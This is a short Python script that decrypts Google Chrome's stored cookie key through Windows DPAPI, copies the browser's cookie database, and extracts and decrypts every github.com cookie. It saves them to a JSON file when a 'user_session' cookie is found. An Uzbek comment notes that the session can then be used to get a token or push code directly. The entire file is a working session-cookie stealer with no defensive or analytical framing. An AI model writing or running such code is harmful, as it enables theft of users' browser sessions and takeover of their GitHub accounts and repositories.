import os, json, base64, sqlite3, shutil
import ctypes
from ctypes import wintypes
from Crypto.Cipher import AES

local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
with open(local_state_path, 'r', encoding='utf-8') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]
blob_in = DATA_BLOB(len(encrypted_key), ctypes.cast(ctypes.create_string_buffer(encrypted_key), ctypes.POINTER(ctypes.c_byte)))
blob_out = DATA_BLOB()
ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)

def decrypt_val(buff):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(aes_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode('utf-8')
    except Exception:
        return ''

cookie_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'
temp_db = 'temp_cookies.db'
shutil.copy2(cookie_db, temp_db)

conn = sqlite3.connect(temp_db)
cursor = conn.cursor()
cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%github.com%'")
rows = cursor.fetchall()
cookies = {}
for host, name, enc_val in rows:
    val = decrypt_val(enc_val)
    if val:
        cookies[name] = val

conn.close()
if os.path.exists(temp_db):
    os.remove(temp_db)

print('Found GitHub cookies:', list(cookies.keys()))
print('Has user_session:', 'user_session' in cookies)

# Endi agar user_session bo'lsa, GitHub orqali token yoki to'g'ridan-to'g'ri push qilish mumkin!
if 'user_session' in cookies:
    print('USER SESSION TOPILDI!')
    with open('gh_session.json', 'w') as out:
        json.dump(cookies, out)
